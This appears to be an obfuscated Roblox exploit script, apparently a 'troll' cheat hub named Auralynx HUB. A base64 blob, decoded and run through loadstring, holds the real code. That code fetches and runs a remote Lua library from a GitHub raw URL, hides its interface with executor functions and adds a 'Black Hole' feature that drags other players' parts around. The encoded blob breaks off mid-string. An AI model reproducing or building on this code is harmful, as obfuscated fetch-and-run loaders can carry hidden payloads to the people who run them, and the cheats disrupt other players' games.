local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function decode(data)
    data = data:gsub('[^'..b..'=]', '')
    local t = {}
    for i=1,#data,4 do
        local c1 = b:find(data:sub(i,i)) or 1
        local c2 = b:find(data:sub(i+1,i+1)) or 1
        local c3 = b:find(data:sub(i+2,i+2)) or 1
        local c4 = b:find(data:sub(i+3,i+3)) or 1

        local n = (c1-1)*262144 + (c2-1)*4096 + (c3-1)*64 + (c4-1)
        local b1 = math.floor(n / 65536) % 256
        local b2 = math.floor(n / 256) % 256
        local b3 = n % 256

        table.insert(t, string.char(b1))
        if data:sub(i+2,i+2) ~= '=' then table.insert(t, string.char(b2)) end
        if data:sub(i+3,i+3) ~= '=' then table.insert(t, string.char(b3)) end
    end
    return table.concat(t)
end

loadstring(decode([[LS0gQmVtIHZpbmRvIGFvIG1ldSBzY3JpcHQsIHNraWRkZXIgaGVoZS4KCmxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBTdGFydGVyR3VpID0gZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIikKbG9jYWwgVHdlZW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKQpsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKCmxvY2FsIHNjcmVlbkd1aSA9IEluc3RhbmNlLm5ldygiU2NyZWVuR3VpIikKc2NyZWVuR3VpLk5hbWUgPSAiQXVyYWx5bnhMb2FkZXIiCnNjcmVlbkd1aS5JZ25vcmVHdWlJbnNldCA9IHRydWUKc2NyZWVuR3VpLlJlc2V0T25TcGF3biA9IGZhbHNlCmlmIHN5biB0aGVuCiAgICBzeW4ucHJvdGVjdF9ndWkoc2NyZWVuR3VpKQogICAgc2NyZWVuR3VpLlBhcmVudCA9IGdhbWUuQ29yZUd1aQplbHNlaWYgZ2V0aHVpIHRoZW4KICAgIHNjcmVlbkd1aS5QYXJlbnQgPSBnZXRodWkoKQplbHNlCiAgICBzY3JlZW5HdWkuUGFyZW50ID0gcGxheWVyOldhaXRGb3JDaGlsZCgiUGxheWVyR3VpIikKZW5kCgpsb2NhbCByZWQgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDQwLCA0MCkKbG9jYWwgZ3JlZW4gPSBDb2xvcjMuZnJvbVJHQigwLCAxODAsIDApCmxvY2FsIHdoaXRlID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKbG9jYWwgZGFyayA9IENvbG9yMy5mcm9tUkdCKDYsIDAsIDApCgpsb2NhbCBmdW5jdGlvbiBjcmVhdGVMb2FkaW5nU2NyZWVuKCkKICAgIGxvY2FsIGd1aSA9IHNjcmVlbkd1aQogICAgbG9jYWwgcHJvbWlzZSA9IHt9CgogICAgbG9jYWwgYmcgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgZ3VpKQogICAgYmcuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAxLCAwKQogICAgYmcuQmFja2dyb3VuZENvbG9yMyA9IGRhcmsKICAgIGJnLkJvcmRlclNpemVQaXhlbCA9IDAKCiAgICBsb2NhbCBiZ0dyYWQgPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiLCBiZykKICAgIGJnR3JhZC5Db2xvciA9IENvbG9yU2VxdWVuY2UubmV3ewogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMCwgcmVkKSwKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuNSwgd2hpdGUpLAogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgZ3JlZW4pCiAgICB9CiAgICBiZ0dyYWQuUm90YXRpb24gPSAyNQoKICAgIGZvciBpID0gMSwgMTUwIGRvCiAgICAgICAgbG9jYWwgc25vdyA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBiZykKICAgICAgICBzbm93LlNpemUgPSBVRGltMi5uZXcoMCwgbWF0aC5yYW5kb20oMiw1KSwgMCwgbWF0aC5yYW5kb20oMiw1KSkKICAgICAgICBzbm93LlBvc2l0aW9uID0gVURpbTIubmV3KG1hdGgucmFuZG9tKCksIDAsIC0wLjEsIDApCiAgICAgICAgc25vdy5CYWNrZ3JvdW5kQ29sb3IzID0gd2hpdGUKICAgICAgICBzbm93LkJvcmRlclNpemVQaXhlbCA9IDAKICAgICAgICBzbm93LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSBtYXRoLnJhbmRvbSgzLDcpLzEwCiAgICAgICAgc25vdy5aSW5kZXggPSAwCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIHNub3cuUGFyZW50IGRvCiAgICAgICAgICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKHNub3csIFR3ZWVuSW5mby5uZXcobWF0aC5yYW5kb20oMyw3KSwgRW51bS5FYXNpbmdTdHlsZS5TaW5lKSwgewogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gVURpbTIubmV3KG1hdGgucmFuZG9tKCksMCwxLjEsMCksCiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IG1hdGgucmFuZG9tKDUsOSkvMTAKICAgICAgICAgICAgICAgIH0pOlBsYXkoKQogICAgICAgICAgICAgICAgdGFzay53YWl0KG1hdGgucmFuZG9tKDMsNykpCiAgICAgICAgICAgICAgICBzbm93LlBvc2l0aW9uID0gVURpbTIubmV3KG1hdGgucmFuZG9tKCksMCwtMC4xLDApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAoKICAgIGxvY2FsIGxpZ2h0cyA9IHt9CiAgICBmb3IgaSA9IDEsIDIwIGRvCiAgICAgICAgbG9jYWwgbCA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBiZykKICAgICAgICBsLlNpemUgPSBVRGltMi5uZXcoMCwgMTMsIDAsIDEzKQogICAgICAgIGwuUG9zaXRpb24gPSBVRGltMi5uZXcoaS8yMCwgMCwgMC4wMywgMCkKICAgICAgICBsLkJhY2tncm91bmRDb2xvcjMgPSAoaSAlIDIgPT0gMCkgYW5kIHJlZCBvciBncmVlbgogICAgICAgIGwuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBsKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygxLCAwKQogICAgICAgIGxpZ2h0c1sjbGlnaHRzKzFdID0gbAogICAgZW5kCgogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgYmcuUGFyZW50IGFuZCBub3QgcHJvbWlzZS5jb21wbGV0ZWQgZG8KICAgICAgICAgICAgYmdHcmFkLlJvdGF0aW9uID0gKGJnR3JhZC5Sb3RhdGlvbiArIDAuMzUpICUgMzYwCiAgICAgICAgICAgIFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpXYWl0KCkKICAgICAgICBlbmQKICAgIGVuZCkKCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBiZy5QYXJlbnQgYW5kIG5vdCBwcm9taXNlLmNvbXBsZXRlZCBkbwogICAgICAgICAgICBmb3IgXywgbCBpbiBpcGFpcnMobGlnaHRzKSBkbwogICAgICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShsLCBUd2VlbkluZm8ubmV3KDAuMzUpLCB7QmFja2dyb3VuZENvbG9yMyA9IHdoaXRlfSk6UGxheSgpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMC40KQogICAgICAgICAgICBmb3IgXywgbCBpbiBpcGFpcnMobGlnaHRzKSBkbwogICAgICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShsLCBUd2VlbkluZm8ubmV3KDAuMzUpLCB7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IG1hdGgucmFuZG9tKDEsMik9PTEgYW5kIHJlZCBvciBncmVlbgogICAgICAgICAgICAgICAgfSk6UGxheSgpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMC40KQogICAgICAgIGVuZAogICAgZW5kKQogICAgCiAgICBsb2NhbCBnbG93Q2lyY2xlID0gSW5zdGFuY2UubmV3KCJJbWFnZUxhYmVsIiwgYmcpCiAgICBnbG93Q2lyY2xlLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpCiAgICBnbG93Q2lyY2xlLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMC41LCAwKQogICAgZ2xvd0NpcmNsZS5TaXplID0gVURpbTIubmV3KDAsIDAsIDAsIDApCiAgICBnbG93Q2lyY2xlLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBnbG93Q2lyY2xlLkltYWdlID0gInJieGFzc2V0aWQ6Ly85NjUwNTU4NzA5MDY1NyIKICAgIGdsb3dDaXJjbGUuSW1hZ2VUcmFuc3BhcmVuY3kgPSAwLjIKCiAgICBsb2NhbCBtYWluID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIGJnKQogICAgbWFpbi5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMC41KQogICAgbWFpbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCkKICAgIG1haW4uU2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKQogICAgbWFpbi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDAsIDApCiAgICBtYWluLkJvcmRlclNpemVQaXhlbCA9IDAKICAgIG1haW4uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBtYWluKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAyNikKCiAgICBsb2NhbCBuZW9uID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIsIG1haW4pCiAgICBuZW9uLkFwcGx5U3Ryb2tlTW9kZSA9IEVudW0uQXBwbHlTdHJva2VNb2RlLkJvcmRlcgogICAgbmVvbi5UaGlja25lc3MgPSAzCiAgICBuZW9uLkNvbG9yID0gcmVkCiAgICBuZW9uLlRyYW5zcGFyZW5jeSA9IDEKCiAgICBsb2NhbCB0aXRsZSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgbWFpbikKICAgIHRpdGxlLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwKQogICAgdGl0bGUuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLCAzMCkKICAgIHRpdGxlLlNpemUgPSBVRGltMi5uZXcoMSwgLTIwLCAwLCA2MCkKICAgIHRpdGxlLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICB0aXRsZS5UZXh0ID0gIvCfjoQgQXVyYWx5bnggSFVCIPCfjoQiCiAgICB0aXRsZS5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJsYWNrCiAgICB0aXRsZS5UZXh0U2NhbGVkID0gdHJ1ZQogICAgdGl0bGUuVGV4dENvbG9yMyA9IHdoaXRlCiAgICB0aXRsZS5UZXh0VHJhbnNwYXJlbmN5ID0gMQogICAgbG9jYWwgZ3JhZCA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIHRpdGxlKQogICAgZ3JhZC5Db2xvciA9IENvbG9yU2VxdWVuY2UubmV3ewogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMCwgcmVkKSwKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuNSwgd2hpdGUpLAogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgZ3JlZW4pCiAgICB9CgogICAgbG9jYWwgc3VidGl0bGUgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIG1haW4pCiAgICBzdWJ0aXRsZS5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMCkKICAgIHN1YnRpdGxlLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMCwgOTUpCiAgICBzdWJ0aXRsZS5TaXplID0gVURpbTIubmV3KDAuOCwgMCwgMCwgMjUpCiAgICBzdWJ0aXRsZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgc3VidGl0bGUuVGV4dCA9ICLwn46E77ixT3B0aW1pemluZyB0cmVlIGRlY29yYXRpb25zLi4uIgogICAgc3VidGl0bGUuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBzdWJ0aXRsZS5UZXh0U2l6ZSA9IDIwCiAgICBzdWJ0aXRsZS5UZXh0Q29sb3IzID0gd2hpdGUKICAgIHN1YnRpdGxlLlRleHRUcmFuc3BhcmVuY3kgPSAxCgogICAgbG9jYWwgdGhhbmtzID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBtYWluKQogICAgdGhhbmtzLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwKQogICAgdGhhbmtzLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMCwgMTI1KQogICAgdGhhbmtzLlNpemUgPSBVRGltMi5uZXcoMC44LCAwLCAwLCAyMCkKICAgIHRoYW5rcy5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgdGhhbmtzLlRleHQgPSAiVGhhbmsgeW91IGZvciAxMDAsMDAwIGV4ZWN1dGlvbnMhIgogICAgdGhhbmtzLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgdGhhbmtzLlRleHRTaXplID0gMTAKICAgIHRoYW5rcy5UZXh0Q29sb3IzID0gd2hpdGUKICAgIHRoYW5rcy5UZXh0VHJhbnNwYXJlbmN5ID0gMQoKICAgIGxvY2FsIGJhckJnID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIG1haW4pCiAgICBiYXJCZy5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMCkKICAgIGJhckJnLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMCwgMTY1KQogICAgYmFyQmcuU2l6ZSA9IFVEaW0yLm5ldygwLjgsIDAsIDAsIDE0KQogICAgYmFyQmcuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDUwLDAsMCkKICAgIGJhckJnLkJvcmRlclNpemVQaXhlbCA9IDAKICAgIGJhckJnLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgYmFyQmcpLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDgpCgogICAgbG9jYWwgYmFyID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIGJhckJnKQogICAgYmFyLlNpemUgPSBVRGltMi5uZXcoMCwgMCwgMSwgMCkKICAgIGJhci5CYWNrZ3JvdW5kQ29sb3IzID0gcmVkCiAgICBiYXIuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIGJhcikuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgOCkKCiAgICBsb2NhbCBwZXJjZW50ID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBtYWluKQogICAgcGVyY2VudC5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMCkKICAgIHBlcmNlbnQuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLCAxOTApCiAgICBwZXJjZW50LlNpemUgPSBVRGltMi5uZXcoMC41LCAwLCAwLCAzMCkKICAgIHBlcmNlbnQuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIHBlcmNlbnQuVGV4dCA9ICIiCiAgICBwZXJjZW50LkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgcGVyY2VudC5UZXh0U2l6ZSA9IDIyCiAgICBwZXJjZW50LlRleHRDb2xvcjMgPSB3aGl0ZQogICAgcGVyY2VudC5UZXh0VHJhbnNwYXJlbmN5ID0gMQogICAgCiAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKGdsb3dDaXJjbGUsIFR3ZWVuSW5mby5uZXcoMS4yLCBFbnVtLkVhc2luZ1N0eWxlLkJhY2spLCB7CiAgICAgICAgU2l6ZSA9IFVEaW0yLm5ldygwLCAxNjAwLCAwLCAxNjAwKSwKICAgICAgICBJbWFnZVRyYW5zcGFyZW5jeSA9IDEKICAgIH0pOlBsYXkoKQogICAgCiAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKG1haW4sIFR3ZWVuSW5mby5uZXcoMC44LCBFbnVtLkVhc2luZ1N0eWxlLkJhY2spLCB7CiAgICAgICAgU2l6ZSA9IFVEaW0yLm5ldygwLCA1MjAsIDAsIDI4MCksCiAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAKICAgIH0pOlBsYXkoKQogICAgdGFzay53YWl0KDAuNSkKICAgIFR3ZWVuU2VydmljZTpDcmVhdGUodGl0bGUsIFR3ZWVuSW5mby5uZXcoMC43KSwge1RleHRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCiAgICB0YXNrLndhaXQoMC4xNSkKICAgIFR3ZWVuU2VydmljZTpDcmVhdGUoc3VidGl0bGUsIFR3ZWVuSW5mby5uZXcoMC43KSwge1RleHRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCiAgICB0YXNrLndhaXQoMC4xNSkKICAgIFR3ZWVuU2VydmljZTpDcmVhdGUodGhhbmtzLCBUd2VlbkluZm8ubmV3KDAuNyksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQogICAgdGFzay53YWl0KDAuMTUpCiAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKGJhckJnLCBUd2VlbkluZm8ubmV3KDAuNiksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQogICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShwZXJjZW50LCBUd2VlbkluZm8ubmV3KDAuNiksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQogICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShuZW9uLCBUd2VlbkluZm8ubmV3KDAuNiksIHtUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgbWFpbi5QYXJlbnQgYW5kIG5vdCBwcm9taXNlLmNvbXBsZXRlZCBkbwogICAgICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKG5lb24sIFR3ZWVuSW5mby5uZXcoMS4yKSwge1RyYW5zcGFyZW5jeSA9IDAuNH0pOlBsYXkoKQogICAgICAgICAgICB0YXNrLndhaXQoMC43KQogICAgICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKG5lb24sIFR3ZWVuSW5mby5uZXcoMS4yKSwge1RyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKICAgICAgICAgICAgdGFzay53YWl0KDAuNykKICAgICAgICBlbmQKICAgIGVuZCkKCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICBmb3IgaSA9IDAsIDEwMCBkbwogICAgICAgICAgICBwZXJjZW50LlRleHQgPSBpIC4uICIlIgogICAgICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKGJhciwgVHdlZW5JbmZvLm5ldygwLjA0KSwgewogICAgICAgICAgICAgICAgU2l6ZSA9IFVEaW0yLm5ldyhpLzEwMCwgMCwgMSwgMCkKICAgICAgICAgICAgfSk6UGxheSgpCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjAyNSkKICAgICAgICBlbmQKCiAgICAgICAgc3VidGl0bGUuVGV4dCA9ICIgQ2hyaXN0bWFzIGV2ZW50IGJvb3RlZC4gIgogICAgICAgIHBlcmNlbnQuVGV4dCA9ICIxMDAlIgogICAgICAgIHRhc2sud2FpdCgwLjc1KQoKICAgICAgICBTdGFydGVyR3VpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgICAgIFRpdGxlID0gIvCfjoQgSG8gSG8gSG8hIPCfjoQiLAogICAgICAgICAgICBUZXh0ID0gIk1lcnJ5IENocmlzdG1hcyEiLAogICAgICAgICAgICBEdXJhdGlvbiA9IDYKICAgICAgICB9KQoKICAgICAgICBwcm9taXNlLmNvbXBsZXRlZCA9IHRydWUKICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKG1haW4sIFR3ZWVuSW5mby5uZXcoMC45KSwgewogICAgICAgICAgICBTaXplID0gVURpbTIubmV3KDAsMCwwLDApLAogICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIH0pOlBsYXkoKQogICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUobmVvbiwgVHdlZW5JbmZvLm5ldygwLjcpLCB7VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQogICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUodGl0bGUsIFR3ZWVuSW5mby5uZXcoMC42KSwge1RleHRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCiAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShzdWJ0aXRsZSwgVHdlZW5JbmZvLm5ldygwLjYpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKHRoYW5rcywgVHdlZW5JbmZvLm5ldygwLjYpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKHBlcmNlbnQsIFR3ZWVuSW5mby5uZXcoMC42KSwge1RleHRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCiAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShiYXJCZywgVHdlZW5JbmZvLm5ldygwLjYpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICBndWk6RGVzdHJveSgpCiAgICBlbmQpCgogICAgcmV0dXJuIHByb21pc2UKZW5kCgpsb2NhbCBmdW5jdGlvbiB3YWl0Rm9yUHJvbWlzZShwcm9taXNlKQogICAgd2hpbGUgbm90IHByb21pc2UuY29tcGxldGVkIGRvIHRhc2sud2FpdCgpIGVuZAplbmQKCndhaXRGb3JQcm9taXNlKGNyZWF0ZUxvYWRpbmdTY3JlZW4oKSkKCmxvY2FsIExpYmFyeSA9IGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbHlueHhkZXYvZnJlZW1hbi1zY3JpcHRzcy9tYWluL3Rlc3R1aS5sdWEiKSkoKQp3b3Jrc3BhY2UuRmFsbGVuUGFydHNEZXN0cm95SGVpZ2h0ID0gLW1hdGguaHVnZQoKbG9jYWwgV2luZG93ID0gTGliYXJ5Ok1ha2VXaW5kb3coewogICAgVGl0bGUgPSAiQXVyYWx5bnggSFVCIChDaHJpc3RtYXMgRWRpdGlvbikiLAogICAgU3ViVGl0bGUgPSAiYnkgRnJlZW1hbiIsCiAgICBMb2FkVGV4dCA9ICJMb2FkaW5nIEF1cmFseW54IEh1Yi4uLiIsCiAgICBGbGFncyA9ICJBdXJhbHlueF9GbGFncyIKfSkKV2luZG93OkFkZE1pbmltaXplQnV0dG9uKHsKICAgIEJ1dHRvbiA9IHsgSW1hZ2UgPSAicmJ4YXNzZXRpZDovLzk2NDQ3Mzc1MzU0ODM5IiwgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAgfSwKICAgIENvcm5lciA9IHsgQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMzUsIDEpIH0sCn0pCgpsb2NhbCBJbmZvVGFiID0gV2luZG93Ok1ha2VUYWIoeyBUaXRsZSA9ICLvuLFJbnRyb2R1Y3Rpb24gdG8gQXVyYWx5bngiLCBJY29uID0gInJieGFzc2V0aWQ6Ly8xMzE1MzE5NDIyOTAyNjciIH0pCgpJbmZvVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkRpc2NvcmQgKENsaWNrIHRvIGNvcHkpIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIHNldGNsaXBib2FyZCgiaHR0cHM6Ly9kaXNjb3JkLmdnL0d4WWtzcTdaUiIpCiAgICBlbmQKfSkKCkluZm9UYWI6QWRkU2VjdGlvbih7IkF1cmFseW54IEhVQiBURUFNIn0pCgpJbmZvVGFiOkFkZFBhcmFncmFwaCh7ICJPd25lciIsICJMeW54ZGV2diIgfSkKSW5mb1RhYjpBZGRQYXJhZ3JhcGgoeyAiU3ViLU93bmVyOiIsICJMaWNlbnNlIiB9KQpJbmZvVGFiOkFkZFBhcmFncmFwaCh7ICJEZXZlbG9wZXJzOiIsICJOb25lIiB9KQoKCkluZm9UYWI6QWRkU2VjdGlvbih7ICJDbGljayAnUmVqb2luJyB0byBqb2luIHRoZSBzYW1lIHNlcnZlci4iIH0pCkluZm9UYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAi8J+Poe+4sVJlam9pbiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBUZWxlcG9ydFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlRlbGVwb3J0U2VydmljZSIpCiAgICAgICAgVGVsZXBvcnRTZXJ2aWNlOlRlbGVwb3J0VG9QbGFjZUluc3RhbmNlKGdhbWUuUGxhY2VJZCwgZ2FtZS5Kb2JJZCwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyKQogICAgZW5kCn0pCgoKbG9jYWwgVHJvbGxUYWIgPSBXaW5kb3c6TWFrZVRhYih7IFRpdGxlID0gIu+4sVRyb2xsIFNjcmlwdHMiLCBJY29uID0gInJieGFzc2V0aWQ6Ly84Mjc2OTk3NDA2MzU2OCIgfSkKClNlY3Rpb24gPSBUcm9sbFRhYjpBZGRTZWN0aW9uKHsKICAgIE5hbWUgPSAiUGVyZmVjdCBzY3JpcHRzIGZvciB0cm9sbGluZyDwn5iOIgp9KQoKClRyb2xsVGFiOkFkZFNlY3Rpb24oeyAi8J+MgO+4sUJsYWNrIEhvbGUiIH0pCgpUcm9sbFRhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJCbGFjayBIb2xlIiwKICAgIERlc2NyaXB0aW9uID0gIvCfk4TvuLFBY3RpdmF0aW5nIHRoaXMgd2lsbCBwdWxsIHBhcnRzIHRvd2FyZHMgeW91ciBjaGFyYWN0ZXIuIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIFdvcmtzcGFjZSA9IGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIikKCmxvY2FsIGFuZ2xlID0gMQpsb2NhbCByYWRpdXMgPSAxNQpsb2NhbCBibGFja0hvbGVBY3RpdmUgPSBmYWxzZQoKbG9jYWwgZnVuY3Rpb24gc2V0dXBQbGF5ZXIoKQogICAgbG9jYWwgY2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIG9yIExvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQoKICAgIGxvY2FsIEZvbGRlciA9IEluc3RhbmNlLm5ldygiRm9sZGVyIiwgV29ya3NwYWNlKQogICAgbG9jYWwgUGFydCA9IEluc3RhbmNlLm5ldygiUGFydCIsIEZvbGRlcikKICAgIGxvY2FsIEF0dGFjaG1lbnQxID0gSW5zdGFuY2UubmV3KCJBdHRhY2htZW50IiwgUGFydCkKICAgIFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICBQYXJ0LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgUGFydC5UcmFuc3BhcmVuY3kgPSAxCgogICAgcmV0dXJuIGh1bWFub2lkUm9vdFBhcnQsIEF0dGFjaG1lbnQxCmVuZAoKbG9jYWwgaHVtYW5vaWRSb290UGFydCwgQXR0YWNobWVudDEgPSBzZXR1cFBsYXllcigpCgppZiBub3QgZ2V0Z2VudigpLk5ldHdvcmsgdGhlbgogICAgZ2V0Z2VudigpLk5ldHdvcmsgPSB7CiAgICAgICAgQmFzZVBhcnRzID0ge30sCiAgICAgICAgVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygxNC40NjI2MjQyNCwgMTQuND